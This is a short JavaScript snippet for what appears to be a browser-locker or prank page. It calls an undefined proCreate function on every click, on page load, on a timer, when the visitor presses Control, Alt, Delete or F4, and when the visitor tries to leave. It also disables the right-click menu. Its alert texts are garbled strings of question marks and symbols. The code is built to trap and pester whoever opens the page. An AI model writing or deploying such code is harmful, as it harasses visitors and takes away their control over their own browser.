document.addEventListener("click", async () => {
	await proCreate(1);
});

window.onload = async () => {
	playBall();
	setTimeout(async () => {
		await proCreate(1)
	}, 4000)
};

window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		const a = document.createElement('a')
		await proCreate(1);
		alert("???????????????????????????????? /??????!?????????");
	}

	return null;
}
window.onbeforeunload = async () => {
	confirm('!!!!!!!!!""??"??$444$?$£*(*"*"')
	await proCreate(1);
}